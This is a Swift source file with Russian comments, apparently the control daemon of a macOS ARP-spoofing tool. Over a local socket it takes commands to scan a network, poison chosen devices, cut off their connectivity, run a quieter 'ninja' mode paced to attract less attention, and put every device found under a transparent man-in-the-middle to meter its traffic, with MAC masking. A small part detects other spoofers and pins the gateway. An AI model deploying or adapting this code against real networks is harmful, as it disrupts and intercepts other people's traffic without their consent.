import Foundation
import ARPSpoofCore

// ForwardingControl вынесен в ARPSpoofCore (с инъекцией sysctl для тестов).

/// Изменяемое состояние демона на время сессии клиента.
final class ServeState {
    var ninja = false     // тихий режим: пассивное обнаружение + умеренный темп травли
    var masked = false    // наш MAC замаскирован на старте (--mask-mac закрепился)
    var monitor = false   // режим замера трафика: прозрачный MITM всех, не режем
    var meter: TrafficMeter?
}

// MARK: - JSON helpers

private func sendJSON(_ fd: Int32, _ obj: [String: Any]) {
    guard var data = try? JSONSerialization.data(withJSONObject: obj) else { return }
    data.append(0x0A)
    data.withUnsafeBytes { raw in _ = write(fd, raw.baseAddress, raw.count) }
}

private func macList(_ cmd: [String: Any]) -> [MACAddress] {
    var out = [MACAddress]()
    if let s = cmd["mac"] as? String, let m = MACAddress(s) { out.append(m) }
    if let arr = cmd["macs"] as? [String] {
        for s in arr { if let m = MACAddress(s) { out.append(m) } }
    }
    return out
}

private func statusPayload(_ engine: SpoofEngine, _ fwd: ForwardingControl, _ state: ServeState) -> [String: Any] {
    let targets: [[String: String]] = engine.active.map { mac in
        ["mac": mac.description, "ip": engine.currentIP(of: mac)?.description ?? ""]
    }
    return [
        "event": "status",
        "targets": targets,
        "forwarding": fwd.isOn,
        "cut": fwd.cutMode,
        "ninja": state.ninja,
        "monitor": state.monitor,
        "gateway": engine.gatewayIP.description,
    ]
}

// MARK: - Unix socket

func makeListeningSocket(path: String, owner: String?) -> Int32? {
    unlink(path)
    let fd = socket(AF_UNIX, SOCK_STREAM, 0)
    guard fd >= 0 else { return nil }

    var addr = sockaddr_un()
    addr.sun_family = sa_family_t(AF_UNIX)
    let capacity = MemoryLayout.size(ofValue: addr.sun_path)
    withUnsafeMutablePointer(to: &addr.sun_path) { raw in
        raw.withMemoryRebound(to: CChar.self, capacity: capacity) { dst in
            _ = strncpy(dst, path, capacity - 1)
        }
    }
    let len = socklen_t(MemoryLayout<sockaddr_un>.size)
    let bound = withUnsafePointer(to: &addr) { ap in
        ap.withMemoryRebound(to: sockaddr.self, capacity: 1) { bind(fd, $0, len) }
    }
    guard bound == 0 else { close(fd); return nil }
    chmod(path, 0o600)
    // GUI запускает serve как root (osascript), но подключается как пользователь —
    // отдаём сокет владельцу, чтобы доступ был только у него, а не 0666 для всех.
    if let owner, let pw = getpwnam(owner) {
        chown(path, pw.pointee.pw_uid, pw.pointee.pw_gid)
    }
    guard listen(fd, 1) == 0 else { close(fd); return nil }
    return fd
}

// MARK: - Command handling

private func handle(_ cmd: [String: Any], client: Int32,
                    engine: SpoofEngine, fwd: ForwardingControl, state: ServeState) {
    guard let c = cmd["cmd"] as? String else {
        sendJSON(client, ["event": "error", "message": "нет поля cmd"]); return
    }
    switch c {
    case "scan":
        // Ниндзя — пассивно (слушаем, 0 исходящих кадров); иначе активный ARP-свип.
        Log.info("cmd scan: \(state.ninja ? "пассивно" : "активно")…")
        let hosts = state.ninja ? engine.spoofer.discoverHostsPassive()
                                : engine.spoofer.discoverHosts()
        for h in hosts { engine.observe(h) }
        let list = hosts.map { h in
            ["ip": h.ip.description, "mac": h.mac.description, "vendor": h.vendor]
        }
        sendJSON(client, ["event": "devices", "list": list])
        Log.info("cmd scan: \(hosts.count) хостов, резолвлю имена…")
        let names = engine.spoofer.resolveNames(for: hosts)
        if !names.isEmpty {
            let pairs = names.map { ["mac": $0.key.description, "name": $0.value] }
            sendJSON(client, ["event": "deviceNames", "names": pairs])
        }
        Log.info("cmd scan: имена отправлены (\(names.count))")

    case "start":
        let macs = macList(cmd)
        for m in macs { engine.start(m) }
        fwd.apply(hasActive: !engine.active.isEmpty)
        Log.info("cmd start: запрошено \(macs.count), активно \(engine.active.count), cut=\(fwd.cutMode), fwd=\(fwd.isOn)")
        sendJSON(client, statusPayload(engine, fwd, state))

    case "stop":
        let macs = macList(cmd)
        for m in macs { engine.stop(m) }
        fwd.apply(hasActive: !engine.active.isEmpty)
        Log.info("cmd stop: запрошено \(macs.count), активно \(engine.active.count)")
        sendJSON(client, statusPayload(engine, fwd, state))

    case "stopAll":
        engine.stopAll()
        fwd.apply(hasActive: false)
        Log.info("cmd stopAll: активно \(engine.active.count)")
        sendJSON(client, statusPayload(engine, fwd, state))

    case "mode":
        if let cut = cmd["cut"] as? Bool {
            fwd.cutMode = cut
            fwd.apply(hasActive: !engine.active.isEmpty)
            Log.info("cmd mode: cut=\(cut), fwd=\(fwd.isOn)")
        }
        sendJSON(client, statusPayload(engine, fwd, state))

    case "ninja":
        if let on = cmd["on"] as? Bool {
            state.ninja = on
            engine.passiveOnly = on   // в ниндзя — ноль исходящих ARP-свипов
            // Тихой остаётся РАЗВЕДКА (пассивное обнаружение), а не сама травля:
            // oneway + редкая переотправка делали cut вялым (жертва восстанавливала
            // ARP между тиками). ARP-poisoning детектируется в любом случае, поэтому
            // режем эффективно (two-way), лишь умеренно снижая темп переотправки.
            Log.info("cmd ninja: \(on)")
        }
        sendJSON(client, statusPayload(engine, fwd, state))

    case "monitor":
        let on = (cmd["on"] as? Bool) ?? false
        if on, !state.ninja {
            // Прозрачный MITM всех найденных — «чисто для замера, без замедления»:
            // forwarding ON, трафик идёт насквозь, считаем байты по MAC.
            let interest = Set(engine.bindings.keys)
                .subtracting([engine.gatewayMAC, engine.spoofer.iface.mac])
            if let meter = try? TrafficMeter(interface: engine.spoofer.iface.name, interest: interest) {
                state.meter = meter
                state.monitor = true
                // Заблокированные (список от GUI) держим ОТРЕЗАННЫМИ через blackhole —
                // их трафик в никуда, доступа не получают даже при forwarding ON;
                // остальные идут сквозь нас и реально замеряются.
                let blocked = (cmd["blocked"] as? [String])?.compactMap { MACAddress($0) } ?? []
                engine.blackholed = Set(blocked)
                fwd.cutMode = false
                for m in interest { engine.start(m) }
                fwd.apply(hasActive: !engine.active.isEmpty)   // forwarding ON
                Log.info("cmd monitor: ON, устройств \(interest.count), blackhole \(engine.blackholed.count), fwd=\(fwd.isOn)")
            } else {
                sendJSON(client, ["event": "error", "message": "не удалось открыть BPF для монитора"])
            }
        } else {
            state.monitor = false
            state.meter = nil
            engine.blackholed = []
            engine.stopAll()
            fwd.cutMode = true
            fwd.apply(hasActive: false)
            Log.info("cmd monitor: OFF")
        }
        sendJSON(client, statusPayload(engine, fwd, state))

    case "status":
        sendJSON(client, statusPayload(engine, fwd, state))

    default:
        sendJSON(client, ["event": "error", "message": "неизвестная команда \(c)"])
    }
}

// MARK: - Serve loop (single-threaded poll multiplex)

func runServe(info: InterfaceInfo, engine: SpoofEngine, bpf: BPFDevice,
              listenFD: Int32, intervalMS: Int, fwd: ForwardingControl, state: ServeState) {
    signal(SIGPIPE, SIG_IGN) // запись в закрытый сокет не должна убивать процесс
    signal(SIGHUP, SIG_IGN)  // пережить выход admin-шелла (запуск без nohup)

    while gStop == 0 {
        // Ждём клиента через poll, чтобы не блокироваться в accept() и ловить Ctrl-C.
        var lfd = pollfd(fd: listenFD, events: Int16(POLLIN), revents: 0)
        if poll(&lfd, 1, 300) <= 0 { continue }
        if gStop != 0 { break }

        let client = accept(listenFD, nil, nil)
        if client < 0 { continue }
        Log.info("client: подключился")

        sendJSON(client, [
            "event": "ready",
            "iface": info.name,
            "ip": info.ip.description,
            "mac": info.mac.description,     // уже маскированный, если masked=true
            "masked": state.masked,
            "wifi": MACMasker.isWiFi(info.name),
            "gateway": engine.gatewayIP.description,
            "gatewayMac": engine.gatewayMAC.description,
        ])

        // Детект чужого ARP-спуфера → алерт клиенту. Если травят НАШ шлюз —
        // активная защита: статически закрепляем правильный MAC шлюза в своём
        // кэше (чужие ARP-ответы его больше не перезапишут).
        var gatewayPinned = false
        engine.onSpoofDetected = { attacker, ip in
            var defended = false
            if ip == engine.gatewayIP {
                ARPPin.pin(ip: engine.gatewayIP, mac: engine.gatewayMAC)
                gatewayPinned = true
                defended = true
                Log.info("🛡 защита: закрепил шлюз \(engine.gatewayIP) → \(engine.gatewayMAC) статически")
            }
            sendJSON(client, ["event": "alert", "kind": "arp-spoof",
                              "mac": attacker.description, "ip": ip.description,
                              "defended": defended])
            Log.warn("ARP-спуфер: \(attacker) выдаёт себя за \(ip)")
        }

        var buf = [UInt8]()
        var lastTick = Date()
        var lastTraffic = Date()

        clientLoop: while gStop == 0 {
            var fds = [
                pollfd(fd: client, events: Int16(POLLIN), revents: 0),
                pollfd(fd: bpf.fd, events: Int16(POLLIN), revents: 0),
            ]
            _ = poll(&fds, 2, 150)

            // Тик травли по расписанию. В ниндзя — баланс: умеренно реже (~1.5×),
            // чтобы меньше шуметь, но травля всё ещё держалась. Было 6с — cut
            // получался вялый (жертва восстанавливала ARP между тиками). Two-way
            // сохраняем: именно он делает обрыв эффективным.
            let eff = state.ninja ? intervalMS * 3 / 2 : intervalMS
            if Date().timeIntervalSince(lastTick) * 1000 >= Double(eff) {
                engine.tick()
                lastTick = Date()
            }

            // Монитор трафика: сливаем счётчик (без блокировки) и раз в секунду
            // шлём KB/s по устройствам. Работает только при включённом мониторе.
            if state.monitor, let meter = state.meter {
                meter.drain()
                if Date().timeIntervalSince(lastTraffic) >= 1.0 {
                    let arr = meter.rates().map {
                        ["mac": $0.key.description, "kbps": String(format: "%.1f", $0.value)]
                    }
                    sendJSON(client, ["event": "traffic", "rates": arr])
                    lastTraffic = Date()
                }
            }

            // Команды от клиента.
            if fds[0].revents & Int16(POLLIN) != 0 || fds[0].revents & Int16(POLLHUP) != 0 {
                var tmp = [UInt8](repeating: 0, count: 4096)
                let n = read(client, &tmp, tmp.count)
                if n <= 0 { break clientLoop } // клиент отключился
                buf.append(contentsOf: tmp[0..<n])
                while let nl = buf.firstIndex(of: 0x0A) {
                    let line = Array(buf[0..<nl])
                    buf.removeSubrange(0...nl)
                    if let obj = try? JSONSerialization.jsonObject(with: Data(line)),
                       let cmd = obj as? [String: Any] {
                        handle(cmd, client: client, engine: engine, fwd: fwd, state: state)
                    }
                }
            }

            // ARP-трафик → обновление связок MAC→IP, уведомление о переезде цели.
            if fds[1].revents & Int16(POLLIN) != 0 {
                for f in bpf.receive(timeoutMS: 0) {
                    if let moved = engine.ingest(f), engine.active.contains(moved),
                       let ip = engine.currentIP(of: moved) {
                        sendJSON(client, ["event": "targetMoved", "mac": moved.description, "ip": ip.description])
                    }
                }
            }
        }

        // Watchdog: клиент ушёл — восстановить кэши и выключить forwarding.
        Log.info("client: отключился — восстанавливаю ARP-кэши")
        engine.onSpoofDetected = nil
        if gatewayPinned {
            ARPPin.unpin(ip: engine.gatewayIP)   // вернуть динамический ARP для шлюза
            gatewayPinned = false
        }
        state.monitor = false
        state.meter = nil
        engine.stopAll()
        fwd.disableIfEnabled()
        close(client)

        // Единственный клиент — GUI. Он ушёл → демон завершает работу,
        // чтобы не оставлять висящий root-процесс.
        break
    }
}
